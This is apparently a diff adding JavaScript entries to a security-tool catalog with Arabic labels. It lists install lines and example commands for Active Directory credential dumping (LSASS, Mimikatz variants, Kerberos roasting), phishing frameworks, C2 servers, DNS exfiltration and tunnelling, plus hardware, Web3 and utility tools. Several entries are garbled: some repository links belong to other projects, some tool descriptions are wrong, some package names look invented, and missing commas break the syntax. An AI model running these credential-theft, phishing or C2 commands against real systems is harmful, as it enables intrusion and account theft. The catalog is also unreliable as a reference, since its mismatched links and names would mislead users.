+{tool:"Coercer",category:"ad",platform:"both",difficulty:"expert",desc:"Multi-coerce",install:"pip install coercer",command:"coercer -u user -p pass -t DC"},
+{tool:"Certipy-AD",category:"ad",platform:"both",difficulty:"expert",desc:"AD CS attack",install:"pip install certipy-ad",command:"certipy find -u user -p pass -dc-ip DC"},
+{tool:"Certi",category:"ad",platform:"both",difficulty:"expert",desc:"AD CS attack",install:"# من GitHub",command:"certi"},
+{tool:"ForgeCert",category:"ad",platform:"kali",difficulty:"expert",desc:"Forge certs",install:"# Windows",command:"ForgeCert.exe"},
+{tool:"Rubeus-S4U",category:"ad",platform:"kali",difficulty:"expert",desc:"S4U attack",install:"# Windows",command:"Rubeus.exe s4u /user:u /rc4:hash"},
+{tool:"Kekeo-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"Kerberos toolkit",install:"# Windows",command:"kekeo.exe"},
+{tool:"Rubeus-ASREP",category:"ad",platform:"kali",difficulty:"expert",desc:"ASREP roast",install:"# Windows",command:"Rubeus.exe asreproast"},
+{tool:"SharpKatz-AD",category:"ad",platform:"kali",difficulty:"expert",desc:".NET Mimikatz",install:"# compile",command:"SharpKatz.exe"},
+{tool:"SafetyKatz-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"Hidden Mimikatz",install:"# Windows",command:"SafetyKatz.exe"},
+{tool:"Pypykatz-AD",category:"ad",platform:"both",difficulty:"expert",desc:"Mimikatz Python",install:"pip install pypykatz",command:"pypykatz lsa minidump lsass.dmp"},
+{tool:"Lsassy-AD",category:"ad",platform:"both",difficulty:"expert",desc:"LSASS remote",install:"pip install lsassy",command:"lsassy -u u -p p 10.0.0.1"},
+{tool:"Nanodump-AD",category:"ad",platform:"kali",difficulty:"expert",desc:"Hidden LSASS dump",install:"# Windows",command:"nanodump.exe"},
+{tool:"AD-Miner",category:"ad",platform:"both",difficulty:"advanced",desc:"AD mining",install:"git clone https://github.com/ADMiners/AntiVirus-ROT",command:"python ad-miner.py"},
+{tool:"Deemon",category:"ad",platform:"both",difficulty:"advanced",desc:"AD monitoring",install:"pip install deemon",command:"deemon -u user -p pass"}
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Social Engineering (30 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Social-Engineer-Toolkit",category:"se",platform:"both",difficulty:"advanced",desc:"إطار SE كامل",install:"git clone https://github.com/trustedsec/social-engineer-toolkit",command:"setoolkit"},
+{tool:"Gophish",category:"se",platform:"both",difficulty:"advanced",desc:"منصة phishing",install:"# من getgophish.com",command:"gophish"},
+{tool:"Evilginx2",category:"se",platform:"both",difficulty:"expert",desc:"Reverse proxy phishing",install:"git clone https://github.com/kgretzky/evilginx2",command:"evilginx2"},
+{tool:"Modlishka",category:"se",platform:"both",difficulty:"expert",desc:"Reverse proxy",install:"git clone https://github.com/drk1wi/Modlishka",command:"modlishka"},
+{tool:"King-Phisher",category:"se",platform:"kali",difficulty:"expert",desc:"Phishing framework",install:"git clone https://github.com/rsmusllp/king-phisher",command:"king-phisher"},
+{tool:"Phishing-Frenzy",category:"se",platform:"both",difficulty:"advanced",desc:"Phishing templates",install:"git clone https://github.com/pentestgeek/phishing-frenzy",command:"# templates"},
+{tool:"Phishery",category:"se",platform:"both",difficulty:"advanced",desc:"Word docs phishing",install:"git clone https://github.com/ryhanson/phishery",command:"phishery -u https://fake -i doc.docx"},
+{tool:"MacroPack-SE",category:"se",platform:"kali",difficulty:"advanced",desc:"Office macros",install:"git clone https://github.com/sevagas/macro_pack",command:"python macro_pack.py"},
+{tool:"HTA-Phishing",category:"se",platform:"kali",difficulty:"advanced",desc:"HTA attacks",install:"# يدوي",command:"# mshta payload"},
+{tool:"DuckyScript-SE",category:"se",platform:"both",difficulty:"advanced",desc:"Rubber Ducky",install:"# Hak5",command:"# payload"},
+{tool:"Phishing-API",category:"se",platform:"both",difficulty:"advanced",desc:"Phishing API",install:"pip install phishing-api",command:"phishing-api"},
+{tool:"CredSniper",category:"se",platform:"both",difficulty:"advanced",desc:"2FA phishing",install:"git clone https://github.com/ustayready/CredSniper",command:"python credsniper.py"},
+{tool:"PhishTool",category:"se",platform:"both",difficulty:"intermediate",desc:"Phishing analysis",install:"# موقع",command:"# phishtool.com"},
+{tool:"PhishLabs",category:"se",platform:"both",difficulty:"intermediate",desc:"URL analysis",install:"# موقع",command:"# phishlabs.com"},
+{tool:"URL2PNG",category:"se",platform:"both",difficulty:"intermediate",desc:"screenshot URLs",install:"# موقع",command:"# url2png.com"},
+{tool:"Domain-Fronting",category:"se",platform:"both",difficulty:"expert",desc:"Domain fronting",install:"# يدوي",command:"# CDN"},
+{tool:"Cloudflare-Tunnel-SE",category:"se",platform:"both",difficulty:"advanced",desc:"CF Tunnel",install:"# cloudflared",command:"cloudflared tunnel"},
+{tool:"Ngrok-SE",category:"se",platform:"both",difficulty:"beginner",desc:"ngrok tunnel",install:"# من ngrok.com",command:"ngrok http 80"},
+{tool:"Localhost-Run",category:"se",platform:"both",difficulty:"beginner",desc:"SSH tunnel",install:"# ssh",command:"ssh -R 80:localhost:8080 nokey@localhost.run"},
+{tool:"Serveo-SE",category:"se",platform:"both",difficulty:"beginner",desc:"serveo tunnel",install:"# ssh",command:"ssh -R sub:80:localhost:8080 serveo.net"},
+{tool:"Phishing-Club",category:"se",platform:"both",difficulty:"advanced",desc:"Phishing platform",install:"# موقع",command:"# phishing.club"},
+{tool:"Phishious",category:"se",platform:"both",difficulty:"advanced",desc:"Evilginx GUI",install:"# من GitHub",command:"phishious"},
+{tool:"HTTrack",category:"se",platform:"both",difficulty:"beginner",desc:"نسخ المواقع",install:"pkg install httrack",command:"httrack http://t.com -O ./clone"},
+{tool:"Wget-Clone",category:"se",platform:"both",difficulty:"beginner",desc:"تنزيل موقع",install:"pkg install wget",command:"wget -mk http://t.com"},
+{tool:"Save-Website",category:"se",platform:"both",difficulty:"beginner",desc:"حفظ موقع",install:"pkg install httrack",command:"httrack -W t.com"},
+{tool:"Mitmproxy-SE",category:"se",platform:"both",difficulty:"intermediate",desc:"MITM proxy",install:"pip install mitmproxy",command:"mitmproxy -p 8080"},
+{tool:"Beef-SE",category:"se",platform:"kali",difficulty:"expert",desc:"Browser exploit",install:"apt install beef-xss",command:"beef-xss"},
+{tool:"Maltego-SE",category:"se",platform:"kali",difficulty:"expert",desc:"OSINT visual",install:"apt install maltego",command:"maltego"},
+{tool:"ReelPhish",category:"se",platform:"both",difficulty:"advanced",desc:"Real-time phishing",install:"git clone https://github.com/fireeye/ReelPhish",command:"python reelphish.py"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Hardware / IoT (30 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Binwalk-HW",category:"hardware",platform:"both",difficulty:"intermediate",desc:"فيرموير",install:"pkg install binwalk",command:"binwalk -Me firmware.bin"},
+{tool:"Firmware-Mod-Kit",category:"hardware",platform:"kali",difficulty:"expert",desc:"فيرموير analysis",install:"git clone https://github.com/rampageX/firmware-mod-kit",command:"./extract-firmware.sh firmware.bin"},
+{tool:"Firmadyne",category:"hardware",platform:"kali",difficulty:"expert",desc:"Firmware emulation",install:"git clone https://github.com/firmadyne/firmadyne",command:"./fat.py"},
+{tool:"Firmwalker",category:"hardware",platform:"both",difficulty:"intermediate",desc:"Firmware analysis",install:"git clone https://github.com/craigz28/firmwalker",command:"./firmwalker.sh"},
+{tool:"EMBA",category:"hardware",platform:"kali",difficulty:"expert",desc:"Firmware analyzer",install:"git clone https://github.com/e-m-b-a/emba",command:"./emba.sh"},
+{tool:"JTAGulator",category:"hardware",platform:"kali",difficulty:"expert",desc:"JTAG tool",install:"# hardware",command:"# physical"},
+{tool:"BusPirate",category:"hardware",platform:"kali",difficulty:"advanced",desc:"Hardware tool",install:"# hardware",command:"# physical"},
+{tool:"OpenOCD",category:"hardware",platform:"both",difficulty:"expert",desc:"On-chip debug",install:"pkg install openocd",command:"openocd -f board/stm32.cfg"},
+{tool:"AVRDUDE",category:"hardware",platform:"both",difficulty:"advanced",desc:"AVR programmer",install:"pkg install avrdude",command:"avrdude -c usbasp"},
+{tool:"Flashrom",category:"hardware",platform:"both",difficulty:"advanced",desc:"Flash BIOS",install:"pkg install flashrom",command:"flashrom -p internal -r backup.bin"},
+{tool:"Mifare-Classic",category:"hardware",platform:"both",difficulty:"advanced",desc:"RFID tools",install:"# hardware",command:"mfoc -O dump.mfd"},
+{tool:"Proxmark3",category:"hardware",platform:"kali",difficulty:"expert",desc:"RFID tool",install:"# hardware",command:"proxmark3"},
+{tool:"Chameleon-Mini",category:"hardware",platform:"kali",difficulty:"expert",desc:"RFID emulator",install:"# hardware",command:"# physical"},
+{tool:"Flipper-Zero",category:"hardware",platform:"kali",difficulty:"intermediate",desc:"Multi-tool",install:"# hardware",command:"# physical"},
+{tool:"HackRF",category:"hardware",platform:"kali",difficulty:"expert",desc:"SDR",install:"apt install hackrf",command:"hackrf_info"},
+{tool:"RTL-SDR",category:"hardware",platform:"both",difficulty:"intermediate",desc:"Software defined radio",install:"pkg install rtl-sdr",command:"rtl_test"},
+{tool:"GNURadio",category:"hardware",platform:"kali",difficulty:"expert",desc:"SDR framework",install:"apt install gnuradio",command:"gnuradio-companion"},
+{tool:"Gqrx",category:"hardware",platform:"kali",difficulty:"intermediate",desc:"SDR GUI",install:"apt install gqrx-sdr",command:"gqrx"},
+{tool:"Universal-Radio-Hacker",category:"hardware",platform:"both",difficulty:"advanced",desc:"RF attacks",install:"git clone https://github.com/jopohl/urh",command:"urh"},
+{tool:"RFCat",category:"hardware",platform:"kali",difficulty:"expert",desc:"RF tool",install:"pip install rfcat",command:"rfcat"},
+{tool:"Yardstick-One",category:"hardware",platform:"kali",difficulty:"expert",desc:"RF attacks",install:"# hardware",command:"# physical"},
+{tool:"Crazyradio",category:"hardware",platform:"kali",difficulty:"expert",desc:"nRF tool",install:"pip install pycrazyradio",command:"# usage"},
+{tool:"MiTM-BLE",category:"hardware",platform:"both",difficulty:"expert",desc:"BLE MITM",install:"pip install gattacker",command:"gattacker"},
+{tool:"Bettercap-BLE",category:"hardware",platform:"both",difficulty:"expert",desc:"BLE attacks",install:"pkg install bettercap",note:"Root",command:"bettercap -iface hci0"},
+{tool:"Bluetoothctl",category:"hardware",platform:"both",difficulty:"beginner",desc:"BT CLI",install:"pkg install bluez",command:"bluetoothctl scan on"},
+{tool:"Hcitool",category:"hardware",platform:"both",difficulty:"beginner",desc:"HCItools",install:"pkg install bluez",command:"hcitool scan"},
+{tool:"Spooftooph",category:"hardware",platform:"both",difficulty:"advanced",desc:"BT spoofing",install:"git clone https://github.com/amitmerchant1990/spooftooph",command:"spooftooph"},
+{tool:"BtleJuice",category:"hardware",platform:"kali",difficulty:"expert",desc:"BLE MITM",install:"npm install -g btlejuice",command:"btlejuice"},
+{tool:"Gatttool",category:"hardware",platform:"both",difficulty:"intermediate",desc:"BLE tool",install:"pkg install bluez",command:"gatttool -b MAC -I"},
+{tool:"Ubertooth",category:"hardware",platform:"kali",difficulty:"expert",desc:"Bluetooth sniff",install:"apt install ubertooth",command:"ubertooth-scan"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — C2 Frameworks (40 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Cobalt-Strike-C2",category:"c2",platform:"kali",difficulty:"legendary",desc:"إطار تجاري",install:"# مدفوع",command:"# client"},
+{tool:"Sliver-C2",category:"c2",platform:"both",difficulty:"expert",desc:"C2 حديث",install:"curl https://sliver.sh/install | sudo bash",command:"sliver"},
+{tool:"Mythic-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 متعدد",install:"git clone https://github.com/its-a-feature/Mythic",command:"sudo ./mythic-cli start"},
+{tool:"Havoc-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 حديث",install:"git clone https://github.com/HavocFramework/Havoc",command:"./havoc"},
+{tool:"Empire-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"PowerShell C2",install:"apt install powershell-empire",command:"powershell-empire server"},
+{tool:"Metasploit-C2",category:"c2",platform:"both",difficulty:"advanced",desc:"MSF handler",install:"pkg install metasploit",command:"use exploit/multi/handler"},
+{tool:"Covenant-C2",category:"c2",platform:"kali",difficulty:"expert",desc:".NET C2",install:"git clone https://github.com/cobbr/Covenant",command:"dotnet run"},
+{tool:"Merlin-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"HTTP/2 C2",install:"git clone https://github.com/Ne0nd0g/merlin",command:"./merlin-server"},
+{tool:"PoshC2-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"PowerShell C2",install:"git clone https://github.com/nettitude/PoshC2",command:"poshc2"},
+{tool:"Faction-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 collaboration",install:"# من GitHub",command:"faction"},
+{tool:"Brute-Ratel-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 .NET",install:"# من GitHub",command:"brute-ratel"},
+{tool:"Nighthawk-C2",category:"c2",platform:"kali",difficulty:"legendary",desc:"C2 commercial",install:"# مدفوع",command:"# client"},
+{tool:"Brute-Shark",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 GUI",install:"# من GitHub",command:"brute-shark"},
+{tool:"SharpC2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 .NET modern",install:"git clone https://github.com/SharpC2/SharpC2",command:"dotnet run"},
+{tool:"RedWarden",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 redirector",install:"# من GitHub",command:"redwarden"},
+{tool:"C3",category:"c2",platform:"kali",difficulty:"expert",desc:"Custom C2",install:"# من GitHub",command:"c3"},
+{tool:"Manjusaka",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 بالصينية",install:"# من GitHub",command:"manjusaka"},
+{tool:"Viper-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 framework",install:"# من GitHub",command:"viper"},
+{tool:"Deimos-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 framework",install:"git clone https://github.com/DeimosC2/DeimosC2",command:"./DeimosC2"},
+{tool:"Octopus-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 Python",install:"git clone https://github.com/malwaredllc/byob",command:"python byob.py"},
+{tool:"Pupy-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 Python",install:"git clone https://github.com/n1nj4sec/pupy",command:"pupysh"},
+{tool:"Koadic-C2",category:"c2",platform:"kali",difficulty:"expert",desc:"Windows C2",install:"git clone https://github.com/zerosum0x0/koadic",command:"koadic"},
+{tool:"SilentTrinity",category:"c2",platform:"kali",difficulty:"expert",desc:".NET C2",install:"git clone https://github.com/byt3bl33d3r/SILENTTRINITY",command:"st.py"},
+{tool:"TrevorC2",category:"c2",platform:"kali",difficulty:"expert",desc:"C2 عبر web",install:"git clone https://github.com/trustedsec/trevorc2",command:"trevorc2_server.py"},
+{tool:"DNSCat2",category:"c2",platform:"both",difficulty:"expert",desc:"DNS C2",install:"git clone https://github.com/iagox86/dnscat2",command:"./dnscat2-server"},
+{tool:"DNSExfiltrator",category:"c2",platform:"both",difficulty:"expert",desc:"DNS exfil",install:"git clone https://github.com/Arno0x/DNSExfiltrator",command:"python dnsexfiltrator.py"},
+{tool:"Iodine",category:"c2",platform:"both",difficulty:"expert",desc:"DNS tunnel",install:"pkg install iodine",command:"iodined -f 10.0.0.1 tunnel.t.com"},
+{tool:"ICMPDoor",category:"c2",platform:"both",difficulty:"expert",desc:"ICMP tunnel",install:"# من GitHub",command:"icmpdoor"},
+{tool:"Hans",category:"c2",platform:"both",difficulty:"expert",desc:"ICMP tunnel",install:"# من GitHub",command:"hans -f -c 10.0.0.1 -p pass"},
+{tool:"Ptunnel",category:"c2",platform:"both",difficulty:"advanced",desc:"ICMP tunnel",install:"pkg install ptunnel",command:"ptunnel -p proxy -lp 8000 -da target"},
+{tool:"Socat-C2",category:"c2",platform:"both",difficulty:"intermediate",desc:"Relay",install:"pkg install socat",command:"socat TCP-LISTEN:8080,fork TCP:target:80"},
+{tool:"Chisel-C2",category:"c2",platform:"both",difficulty:"advanced",desc:"TCP tunnel",install:"go install github.com/jpillora/chisel@latest",command:"chisel server -p 8080"},
+{tool:"Neo-ReGeorg",category:"c2",platform:"both",difficulty:"expert",desc:"Tunnel via web",install:"git clone https://github.com/L-codes/Neo-reGeorg",command:"python neoreg.py -k password -u http://t.com/tunnel.php"},
+{tool:"Tunna",category:"c2",platform:"both",difficulty:"expert",desc:"Tunnel via web",install:"git clone https://github.com/SECFORCE/Tunna",command:"python proxy.py -u http://t.com/tunna.php"},
+{tool:"Goproxy",category:"c2",platform:"both",difficulty:"advanced",desc:"Proxy",install:"# من GitHub",command:"goproxy"},
+{tool:"Stowaway",category:"c2",platform:"both",difficulty:"expert",desc:"Proxy tunnel",install:"# من GitHub",command:"stowaway admin"},
+{tool:"Venom-Proxy",category:"c2",platform:"both",difficulty:"advanced",desc:"Proxy",install:"# من GitHub",command:"venom admin"},
+{tool:"Frp",category:"c2",platform:"both",difficulty:"advanced",desc:"Reverse proxy",install:"# من GitHub",command:"frpc -c frpc.ini"},
+{tool:"Nps",category:"c2",platform:"both",difficulty:"advanced",desc:"Proxy server",install:"# من GitHub",command:"nps"},
+{tool:"Ngrok-C2",category:"c2",platform:"both",difficulty:"beginner",desc:"ngrok",install:"# ngrok.com",command:"ngrok tcp 4444"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Web3 / Blockchain (30 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Slither",category:"web3",platform:"both",difficulty:"expert",desc:"Solidity analyzer",install:"pip install slither-analyzer",command:"slither contract.sol"},
+{tool:"Mythril",category:"web3",platform:"both",difficulty:"expert",desc:"EVM security",install:"pip install mythril",command:"myth analyze contract.sol"},
+{tool:"Echidna",category:"web3",platform:"kali",difficulty:"expert",desc:"Fuzzing EVM",install:"# من GitHub",command:"echidna-test contract.sol"},
+{tool:"Manticore",category:"web3",platform:"both",difficulty:"expert",desc:"Symbolic execution",install:"pip install manticore",command:"manticore contract.sol"},
+{tool:"Oyente",category:"web3",platform:"both",difficulty:"expert",desc:"Smart contract analyzer",install:"# من GitHub",command:"python oyente.py -s contract.sol"},
+{tool:"Securify",category:"web3",platform:"kali",difficulty:"expert",desc:"Solidity scanner",install:"# من GitHub",command:"securify contract.sol"},
+{tool:"SmartCheck",category:"web3",platform:"both",difficulty:"expert",desc:"Solidity static",install:"# من GitHub",command:"smartcheck -p contract.sol"},
+{tool:"ContractFuzzer",category:"web3",platform:"kali",difficulty:"expert",desc:"Fuzzer",install:"# من GitHub",command:"contractfuzzer"},
+{tool:"Maian",category:"web3",platform:"kali",difficulty:"expert",desc:"Smart contract scanner",install:"# من GitHub",command:"python maian.py -s contract.sol"},
+{tool:"Ethersplay",category:"web3",platform:"kali",difficulty:"expert",desc:"EVM disassembler",install:"# من GitHub",command:"ethersplay contract.bytecode"},
+{tool:"Porosity",category:"web3",platform:"kali",difficulty:"expert",desc:"EVM decompiler",install:"# من GitHub",command:"porosity"},
+{tool:"Panoramix",category:"web3",platform:"kali",difficulty:"expert",desc:"EVM decompiler",install:"# قديم",command:"panoramix"},
+{tool:"Metamask",category:"web3",platform:"both",difficulty:"beginner",desc:"محفظة Web3",install:"# extension",command:"# browser"},
+{tool:"Remix-IDE",category:"web3",platform:"both",difficulty:"beginner",desc:"Solidity IDE",install:"# site",command:"remix.ethereum.org"},
+{tool:"Truffle",category:"web3",platform:"both",difficulty:"intermediate",desc:"Framework",install:"npm install -g truffle",command:"truffle compile"},
+{tool:"Hardhat",category:"web3",platform:"both",difficulty:"intermediate",desc:"ETH framework",install:"npm install --save-dev hardhat",command:"npx hardhat"},
+{tool:"Foundry",category:"web3",platform:"both",difficulty:"advanced",desc:"ETH toolkit",install:"curl -L https://foundry.paradigm.xyz | bash",command:"forge build"},
+{tool:"Ganache",category:"web3",platform:"both",difficulty:"beginner",desc:"Local blockchain",install:"npm install -g ganache",command:"ganache"},
+{tool:"Web3.py",category:"web3",platform:"both",difficulty:"intermediate",desc:"Python library",install:"pip install web3",command:"python -c 'from web3 import Web3'"},
+{tool:"Ethers.js",category:"web3",platform:"both",difficulty:"intermediate",desc:"JS library",install:"npm install ethers",command:"node -e 'const {ethers} = require(\"ethers\")'"},
+{tool:"Brownie",category:"web3",platform:"both",difficulty:"advanced",desc:"Python framework",install:"pip install eth-brownie",command:"brownie compile"},
+{tool:"Etherscan-API",category:"web3",platform:"both",difficulty:"beginner",desc:"Blockchain explorer",install:"# API key",command:"# etherscan.io"},
+{tool:"Blockchair",category:"web3",platform:"both",difficulty:"beginner",desc:"Explorer",install:"# site",command:"blockchair.com"},
+{tool:"Bitquery",category:"web3",platform:"both",difficulty:"advanced",desc:"Blockchain data",install:"# site",command:"bitquery.io"},
+{tool:"Dune-Analytics",category:"web3",platform:"both",difficulty:"advanced",desc:"Analytics",install:"# site",command:"dune.com"},
+{tool:"Tenderly",category:"web3",platform:"both",difficulty:"advanced",desc:"Debugging",install:"# site",command:"tenderly.co"},
+{tool:"Revoke.cash",category:"web3",platform:"both",difficulty:"beginner",desc:"Revoke approvals",install:"# site",command:"revoke.cash"},
+{tool:"MEV-Inspect",category:"web3",platform:"both",difficulty:"expert",desc:"MEV analysis",install:"# من GitHub",command:"mev-inspect"},
+{tool:"Flashbots",category:"web3",platform:"both",difficulty:"expert",desc:"MEV",install:"npm install @flashbots/ethers-provider-bundle",command:"node script.js"},
+{tool:"Rekt-News",category:"web3",platform:"both",difficulty:"beginner",desc:"DeFi hacks",install:"# site",command:"rekt.news"}
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — إضافات (Web3 + Hardware + Misc) - استكمال
+// ═══════════════════════════════════════════════════════
+{tool:"Ethers.js-Web3",category:"web3",platform:"both",difficulty:"intermediate",desc:"مكتبة JS",install:"npm install ethers",command:"node -e 'require(\"ethers\")'"},
+{tool:"Ethersplay-Web3",category:"web3",platform:"kali",difficulty:"expert",desc:"EVM disasm",install:"# GitHub",command:"ethersplay"},
+{tool:"Contract-Diff",category:"web3",platform:"both",difficulty:"expert",desc:"Diff contracts",install:"pip install contract-diff",command:"contract-diff old.sol new.sol"},
+{tool:"Halmos",category:"web3",platform:"both",difficulty:"expert",desc:"Symbolic testing",install:"pip install halmos",command:"halmos"},
+{tool:"Certora",category:"web3",platform:"both",difficulty:"legendary",desc:"Formal verification",install:"pip install certora-cli",command:"certoraRun contract.sol"},
+{tool:"Semgrep-Web3",category:"web3",platform:"both",difficulty:"expert",desc:"Static analyzer",install:"pip install semgrep",command:"semgrep --config=smart-contract contract.sol"},
+{tool:"Aderyn",category:"web3",platform:"both",difficulty:"expert",desc:"Rust Solidity linter",install:"# GitHub",command:"aderyn ."},
+{tool:"Wake",category:"web3",platform:"both",difficulty:"expert",desc:"Solidity testing",install:"pip install eth-wake",command:"wake test"},
+{tool:"Solc-Selectors",category:"web3",platform:"both",difficulty:"advanced",desc:"Extract selectors",install:"pip install solc-select",command:"solc-select install 0.8.0"},
+{tool:"Solgraph",category:"web3",platform:"both",difficulty:"advanced",desc:"Visualize contracts",install:"npm install -g solgraph",command:"solgraph contract.sol | dot -Tpng -o out.png"},
+{tool:"4byte-Directory",category:"web3",platform:"both",difficulty:"beginner",desc:"Function signatures",install:"# site",command:"4byte.directory"},
+{tool:"Ape-Framework",category:"web3",platform:"both",difficulty:"expert",desc:"Python framework",install:"pip install eth-ape",command:"ape compile"},
+{tool:"Ethernal",category:"web3",platform:"both",difficulty:"advanced",desc:"Blockchain explorer",install:"# site",command:"ethernal"},
+{tool:"Tenderly-Debugger",category:"web3",platform:"both",difficulty:"advanced",desc:"Debugger",install:"# site",command:"tenderly.co"},
+{tool:"Blocksec",category:"web3",platform:"both",difficulty:"advanced",desc:"Security",install:"# site",command:"blocksec.com"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Miscellaneous / Utility (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Tmux",category:"misc",platform:"both",difficulty:"beginner",desc:"Terminal multiplexer",install:"pkg install tmux",command:"tmux new -s work"},
+{tool:"Screen",category:"misc",platform:"both",difficulty:"beginner",desc:"Terminal sessions",install:"pkg install screen",command:"screen -S work"},
+{tool:"Zsh",category:"misc",platform:"both",difficulty:"beginner",desc:"Shell متقدم",install:"pkg install zsh",command:"zsh"},
+{tool:"Fish",category:"misc",platform:"both",difficulty:"beginner",desc:"Friendly shell",install:"pkg install fish",command:"fish"},
+{tool:"Oh-My-Zsh",category:"misc",platform:"both",difficulty:"beginner",desc:"Zsh config",install:"sh -c '$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)'",command:"source ~/.zshrc"},
+{tool:"Vim",category:"misc",platform:"both",difficulty:"beginner",desc:"محرر نصوص",install:"pkg install vim",command:"vim file.txt"},
+{tool:"Neovim",category:"misc",platform:"both",difficulty:"beginner",desc:"Vim محسّن",install:"pkg install neovim",command:"nvim"},
+{tool:"Tmuxinator",category:"misc",platform:"both",difficulty:"intermediate",desc:"Tmux manager",install:"gem install tmuxinator",command:"tmuxinator start project"},
+{tool:"Fzf",category:"misc",platform:"both",difficulty:"beginner",desc:"Fuzzy finder",install:"pkg install fzf",command:"find . | fzf"},
+{tool:"Ripgrep",category:"misc",platform:"both",difficulty:"beginner",desc:"grep سريع",install:"pkg install ripgrep",command:"rg pattern"},
+{tool:"Bat",category:"misc",platform:"both",difficulty:"beginner",desc:"cat محسّن",install:"pkg install bat",command:"bat file.txt"},
+{tool:"Exa",category:"misc",platform:"both",difficulty:"beginner",desc:"ls محسّن",install:"pkg install exa",command:"exa -la"},
+{tool:"Lsd",category:"misc",platform:"both",difficulty:"beginner",desc:"ls حديث",install:"# GitHub",command:"lsd -la"},
+{tool:"Zoxide",category:"misc",platform:"both",difficulty:"beginner",desc:"cd ذكي",install:"pkg install zoxide",command:"z project"},
+{tool:"Delta",category:"misc",platform:"both",difficulty:"beginner",desc:"git diff محسّن",install:"# GitHub",command:"git diff | delta"},
+{tool:"Tig",category:"misc",platform:"both",difficulty:"beginner",desc:"git TUI",install:"pkg install tig",command:"tig"},
+{tool:"Lazygit",category:"misc",platform:"both",difficulty:"beginner",desc:"git TUI",install:"# GitHub",command:"lazygit"},
+{tool:"Jq",category:"misc",platform:"both",difficulty:"beginner",desc:"JSON processor",install:"pkg install jq",command:"cat data.json | jq ."},
+{tool:"Yq",category:"misc",platform:"both",difficulty:"beginner",desc:"YAML processor",install:"pip install yq",command:"yq . file.yaml"},
+{tool:"Htop",category:"misc",platform:"both",difficulty:"beginner",desc:"Process monitor",install:"pkg install htop",command:"htop"},
+{tool:"Btop",category:"misc",platform:"both",difficulty:"beginner",desc:"htop محسّن",install:"# GitHub",command:"btop"},
+{tool:"Glances",category:"misc",platform:"both",difficulty:"intermediate",desc:"System monitor",install:"pip install glances",command:"glances"},
+{tool:"Ncdu",category:"misc",platform:"both",difficulty:"beginner",desc:"Disk usage",install:"pkg install ncdu",command:"ncdu /"},
+{tool:"Dust",category:"misc",platform:"both",difficulty:"beginner",desc:"du محسّن",install:"pkg install dust",command:"dust"},
+{tool:"Procs",category:"misc",platform:"both",difficulty:"beginner",desc:"ps محسّن",install:"pkg install procs",command:"procs"},
+{tool:"Ranger",category:"misc",platform:"both",difficulty:"beginner",desc:"File manager TUI",install:"pkg install ranger",command:"ranger"},
+{tool:"Lf",category:"misc",platform:"both",difficulty:"beginner",desc:"File manager",install:"pkg install lf",command:"lf"},
+{tool:"Nnn",category:"misc",platform:"both",difficulty:"beginner",desc:"File manager",install:"pkg install nnn",command:"nnn"},
+{tool:"Neofetch",category:"misc",platform:"both",difficulty:"beginner",desc:"System info",install:"pkg install neofetch",command:"neofetch"},
+{tool:"Pfetch",category:"misc",platform:"both",difficulty:"beginner",desc:"Fetch بسيط",install:"pkg install pfetch",command:"pfetch"},
+{tool:"Wget",category:"misc",platform:"both",difficulty:"beginner",desc:"تنزيل ملفات",install:"pkg install wget",command:"wget -r https://t.com"},
+{tool:"Curl",category:"misc",platform:"both",difficulty:"beginner",desc:"HTTP client",install:"pkg install curl",command:"curl -X POST https://t.com"},
+{tool:"HTTPie",category:"misc",platform:"both",difficulty:"beginner",desc:"curl محسّن",install:"pip install httpie",command:"http POST https://t.com"},
+{tool:"Httpx-Misc",category:"misc",platform:"both",difficulty:"beginner",desc:"HTTP client حديث",install:"pip install httpx",command:"python -c 'import httpx'"},
+{tool:"Hurl",category:"misc",platform:"both",difficulty:"intermediate",desc:"HTTP testing",install:"# GitHub",command:"hurl requests.hurl"},
+{tool:"Vegeta",category:"misc",platform:"both",difficulty:"intermediate",desc:"Load testing",install:"# GitHub",command:"vegeta attack -targets=urls.txt | vegeta report"},
+{tool:"Hey",category:"misc",platform:"both",difficulty:"intermediate",desc:"Load testing",install:"# GitHub",command:"hey -n 1000 -c 50 https://t.com"},
+{tool:"Bombardier",category:"misc",platform:"both",difficulty:"intermediate",desc:"Load testing",install:"# GitHub",command:"bombardier -c 100 https://t.com"},
+{tool:"Wrk",category:"misc",platform:"both",difficulty:"intermediate",desc:"HTTP benchmarking",install:"pkg install wrk",command:"wrk -t12 -c400 -d30s https://t.com"},
+{tool:"Apache-Bench",category:"misc",platform:"both",difficulty:"intermediate",desc:"ab benchmark",install:"pkg install apache2",command:"ab -n 1000 -c 10 https://t.com"},
+{tool:"Siege",category:"misc",platform:"both",difficulty:"intermediate",desc:"HTTP load",install:"pkg install siege",command:"siege -c 25 -t 1M https://t.com"},
+{tool:"Locust",category:"misc",platform:"both",difficulty:"intermediate",desc:"Load testing Python",install:"pip install locust",command:"locust -f locustfile.py"},
